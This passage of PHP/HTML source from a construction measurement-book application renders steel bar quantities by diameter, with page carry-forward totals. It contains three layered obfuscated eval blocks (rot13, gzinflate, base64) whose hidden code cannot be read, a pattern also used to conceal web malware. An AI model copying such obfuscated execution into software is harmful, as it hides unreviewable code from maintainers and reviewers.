vZb0/hZ4Rv1LvOAgkSo23ylrrTcRHo0d3FrkhdQaCiJp+zDux4G27r2phECT48gAj98AW5MarJPuBAClmo9LkeZPBLrzMwKFmy6wWeXjEdaDa0O+/zKOR8delU6VehMLkoH9QUnc3aWuohOUJajGCV/+tE18Xk/neCFtQviSB+qXz/+IrlhzWWmC/xyyxw0srIMqlSDpqWizpaQ/vRzgzS0OVAfPcs9g9TnXbM56jtMg9s7L6K3tGgtQCfIIhCUYzLnVwrulP7llmHSgxV/huYLu0i1rd1Z0c+zvjstG/Se5cKUpG99ihtktLYTrT61xyx3YQX8NqzqexbuS40/dx/qZ5/lqZU5N71+t0iq2f/Obxxs/8GmHa5MAh5vMaVDwwihlUuB8xpfa2itvWGRNZ0l/Zw0j/h3to++l9gowPV2ajFDzI0dasmgpernxQnMyssgn6LPxf3mETDhGTmNRorrXJDQNLCcTHoj6mTac1edXBaQDDMgVrwEdDhDDnhafWpfUIz5e1GzPIao46/j7fNySGKHnYZTM1DzJ/NOzEAynitWAeCwptCpigz86u5O54x2vgyha3TcGnaY21Xh7AOMcG5NZBokrf2YtCtj7KgUi/qckU+oXrSxy0vAhP7LJj62RlzuOi55WwpERPODRvOMGM4OvtOD/sPpE2dTJOoGLYqb9fQ0OiTd29X5xQZxwwvnHGl+YewSOI6v65eXvsuQL1+Zf//r/f37vw==')))));

            ?>
            <?php echo $table2; $tablehead = $table;?>

            <table width="1087px" border="0" cellpadding="3" cellspacing="3" align="center" bgcolor='#FFFFFF' class="label">
			<?php echo $table1; ?>
                <?php 
               eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

			   $sqlmeasurequery = mysql_query($measurequery);    
               if($sqlmeasurequery == true)
               {
                while ($List = mysql_fetch_object($sqlmeasurequery)) 
                { //echo $mpage;
				if($List->shortnotes == ""){ $List->shortnotes = $List->description; }
				$decimal = get_decimal_placed($List->subdivid,$sheetid);
				$sub_type = $List->sub_type;
				//$meas_no = $List->measurement_no;
				$meas_no1 = $List->measurement_no;
				$meas_no2 = $List->measurement_no2;
				if(($meas_no2 != "") && ($meas_no2 != 0))
				{
					$meas_no = $meas_no1*$meas_no2;
				}
				else
				{
					$meas_no = $meas_no1;
				}
				$_SESSION['last_row_check'] = 0;
					if($mpage > 100)
					{
						/*if($_GET['varid'] == 1)
						{
							
							
							?>
							<div id="dialog" title="Choose MBook No." style=" background-color:#f9f8f6;font-size: 12px;">
							<p style="font-size:12px; font-weight:bold; color:#911200;">Select Next MBook Number</p>
							<select id="newmbooklist" name="mb" style="width:275px;">
							<option value="">---------------------Select--------------------</option>
							<?php echo $objBind->BindMBookList($mbookno,$sheetid,$staffid,$mbooktype); ?>
							</select>
							<br/>
							<span id="error_msg" style="color:#FF0000; font-weight:bold;"></span>
							<input type="button" class="submit_btn" id="btn" style="color:#FFFFFF;background-color:#9c27b0;border:none;" name="btn" value="Submit"/>
							<input type="button" class="cancel_btn" id="btn_cancel" style="color:#FFFFFF;background-color:#e51c23;border:none;" name="btn_cancel" value="Cancel"/>
							</div>
							<?php
						}*/
						/*$currentline = $start_line + 13;
						$prevpage = 100;
						$mpage = $newmbookpageno;
						//$prevpage = $mpage;
						$mbookno = $newmbookno;*/
					}
					
					
					if(($mpage != $prevpage) && ($prevdate == $List->date) && ($prevsubdivid == $List->subdivid))
					{
						$tmb2 = $sumst;
                     $explodedval = explode("@",$tmb2); 
                     for($i=0;$i<count($explodedval);$i++)
                     {
                       if($explodedval[$i] != "")
                       {
                         $expval = explode("*",$explodedval[$i]); 
                         if($expval[0] == 8){ $tot8 = $tot8 + $expval[1]; }
                         if($expval[0] == 10){ $tot10 = $tot10 + $expval[1]; }
                         if($expval[0] == 12){ $tot12 = $tot12 + $expval[1]; }
                         if($expval[0] == 16){ $tot16 = $tot16 + $expval[1]; }
                         if($expval[0] == 20){ $tot20 = $tot20 + $expval[1]; }
                         if($expval[0] == 25){ $tot25 = $tot25 + $expval[1]; }
                         if($expval[0] == 28){ $tot28 = $tot28 + $expval[1]; }
                         if($expval[0] == 32){ $tot32 = $tot32 + $expval[1]; }
						 if($expval[0] == 36){ $tot36 = $tot36 + $expval[1]; }
                        }
                     } 
					 if($tot8 != "" || $tot10 != "" || $tot12 != "" || $tot16 != "" || $tot20 != "" || $tot25 != "" || $tot28 != "" || $tot32 != "" || $tot36!= "")
					 {
					 ?>
						
					<tr height=''>
                    <td width='' colspan="7" class='labelbold' style='text-align:right'><?php echo "B/f from Page ".$prevpage."/ Steel MB No.".$prevmbookno."";  ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelbold' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelbold'><?php //echo $mpage; ?></td>-->
                	</tr>
				<?php
					 $currentline++;
					 }
				//echo $currentline;
				//$currentline++;
				if($currentline>31)
				{ 
					if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
					{
					echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
					}
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				}
				
                    $measurementdia=$List->measurement_dia;
                    //$NOS=chop($List->measurement_no);
                    //$LOM=chop($List->measurement_l);
                    //$totaldia=trim($NOS*$LOM);
                    $NOS=chop($List->measurement_no);
					$NOS2=chop($List->measurement_no2);
                    $LOM=chop($List->measurement_l);
					if(($NOS2 != "") && ($NOS2 != 0))
					{
                    	$totaldia=round(($NOS*$LOM*$NOS2),$decimal);
					}
					else
					{
                    	$totaldia=round(($NOS*$LOM),$decimal);
					}
                    
                    if($prevsubdiv_name != $List->subdiv_name)
                    {
                        if($prevsubdiv_name != "")
                        {
                            $temp = 1;
                        } 
                        if($prevsubdiv_name == "")
                        {
                        ?>
                            <tr height=''>
                                <td width='' class='labelcenter'><?php echo $List->date; ?></td>
                                <td width='' class='labelcenter'><?php echo $List->subdiv_name; ?></td>
                                <td width='' colspan="14" class='labelcenter' style="text-align:left;"><?php echo $List->shortnotes; ?></td>
                            </tr>
                  <?php 
				  		//$length1 = strlen($List->shortnotes);
						//$linecnt1 = ceil($length1/145);
						$wrap_cnt1 = 0;
						$WrapReturn1 = getWordWrapCount($List->shortnotes,145);
						$shortnotes = $WrapReturn1[0];
						$wrap_cnt1 = $WrapReturn1[1];
						
				  		$currentline = $currentline + $wrap_cnt1;
							if($currentline>31)
							{ 
								if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
								{
								echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
								}
								echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
								/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
								if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
							}
                        }
                    }
                   if(($prevdate != $List->date) && ($prevsubdiv_name == $List->subdiv_name))
                   {
                       if($prevdate !== "")
                       {
                      $temp = 1;
                       }
                   }
                   if($temp == 1)
                   {
                     $tmb = $sumst;
                     $explodedval = explode("@",$tmb); 
                     for($i=0;$i<count($explodedval);$i++)
                     {
                       if($explodedval[$i] != "")
                       {
                         $expval = explode("*",$explodedval[$i]); 
                         if($expval[0] == 8){ $tot8 = $tot8 + $expval[1]; }
                         if($expval[0] == 10){ $tot10 = $tot10 + $expval[1]; }
                         if($expval[0] == 12){ $tot12 = $tot12 + $expval[1]; }
                         if($expval[0] == 16){ $tot16 = $tot16 + $expval[1]; }
                         if($expval[0] == 20){ $tot20 = $tot20 + $expval[1]; }
                         if($expval[0] == 25){ $tot25 = $tot25 + $expval[1]; }
                         if($expval[0] == 28){ $tot28 = $tot28 + $expval[1]; }
                         if($expval[0] == 32){ $tot32 = $tot32 + $expval[1]; }
						 if($expval[0] == 36){ $tot36 = $tot36 + $expval[1]; }
                        }
                     }
                        ?>
                <tr height=''>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' bgcolor=""></td>
                    <td width='' colspan="4" class='labelcenter' style='text-align:right'>
					<input type="text" class="labelbold" name="txt_pageid" readonly="" id="txt_pageid<?php echo $txtboxid; ?>" style="width:100%; text-align:right; border:none;" />
				</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
                	
                <?php 
				
				eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

				if($prev_sub_type != 'c'){
                $summary1 .= $prevsubdiv_name.",".$prevdate.",".$mpage.",".$mbookno.",".$totalweight_MT.",".$prevsubdivid.",".$prevdivid.",".$tot8.",".$tot10.",".$tot12.",".$tot16.",".$tot20.",".$tot25.",".$tot28.",".$tot32.",".$tot36.",".$txtboxid.",".$prev_decimal.","."".",".""."@";//echo $summary1;
				//echo $summary1."SSSS<br/>";
				}
				$currentline++;
				if($currentline>31)
				{ 
					if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
					{
					echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
					}
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
                //echo $summary1;
                //THIS PART IS FOR 2 LINE SPACE BETWEEN NEWDATE AND OLD DATE 
                if(($prevdate != $List->date) && ($prevdate !== ""))
                    {
					
                        ?>
                        <tr height='' style="border:none;" class="label" align="right"><td colspan="16" style="border:none;"><br/><?php //echo $staffname." - ".$designation; ?>&nbsp;&nbsp;</td></tr>
						<tr height='' style="border:none;" class="label" align="right">
						<td colspan="5" style="border:none;">&nbsp;&nbsp;</td>
						<td colspan="6" style="border:none;">Checked By&nbsp;&nbsp;</td>
						<td colspan="5" style="border:none;">Prepared By&nbsp;&nbsp;</td>
						</tr>
                <?php
				$currentline = $currentline+3;
					if($currentline>31)
					{ 
						if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
						{
						echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
						}
						echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
						/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
						if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
					}
                  }
                    ?>
                <tr height=''>
                            <td width='8%' class='labelcenter'><?php echo $List->date; ?></td>
                            <td width='' class='labelcenter'><?php echo $List->subdiv_name; ?></td>
                            <td width='' colspan="14" class='labelcenter' style="text-align:left;"><?php echo $List->shortnotes; ?></td>
                 </tr>
                        <?php 
                         $sumst = "";  
					   	//$length2 = strlen($List->shortnotes);
						//$linecnt2 = ceil($length2/145);
						$wrap_cnt2 = 0;
						$WrapReturn2 = getWordWrapCount($List->shortnotes,145);
						$shortnotes = $WrapReturn2[0];
						$wrap_cnt2 = $WrapReturn2[1];
						
				  		$currentline = $currentline + $wrap_cnt2;
						if($currentline>31)
						{ 
							if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
							{
							echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
							}
							echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
							/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
							if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
						}
                  }
				//$descwork = wordwrap($List->descwork,45,"<br>\n");
				//$wwl = explode("\n", $descwork);
				//$wwlcount = count($wwl);
				//$length3 = strlen(trim($descwork));
				//$linecnt3 = ceil($length3/45); //echo $linecnt3;
				
				$wrap_cnt3 = 0;	
				$WrapReturn3 = getWordWrapCount($List->descwork,50);
				$descwork = $WrapReturn3[0];
				$wrap_cnt3 = $WrapReturn3[1];
				$currentline = $currentline + $wrap_cnt3;
                    ?>
                
                <tr height=''>
                    <td width='8%' class=''><?php //echo $List->subdivid; ?></td>
                    <td width='4%' class=''><?php //echo $currentline;//echo $List->subdiv_name;//if(($prevdate != $List->date) && ($prevsubdiv_name != $List->subdiv_name)) { echo $List->subdiv_name; } else { echo ""; } ?></td>
                    <td width='12%' class='' style="text-align:left;" nowrap="nowrap"><?php echo $descwork; ?></td>
                    <td width='3%' class='' style="text-align:right"><?php echo $List->measurement_dia; ?></td>
                    <td width='3%' class='' style="text-align:right"><?php if($List->measurement_no2 != 0) { echo $List->measurement_no2; } ?></td>
                    <td width='3%' class='' style="text-align:right"><?php if($List->measurement_no != 0) { echo $List->measurement_no; } ?></td>
                    <td width='4%' class='' style="text-align:right"><?php if($List->measurement_l != 0) { echo $List->measurement_l; } ?></td>
                    <?php
        if($measurementdia == 8){ ?><td width='7%' class='' style="text-align:right"><?php $dia = 8; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiaeight+=$totaldia; }
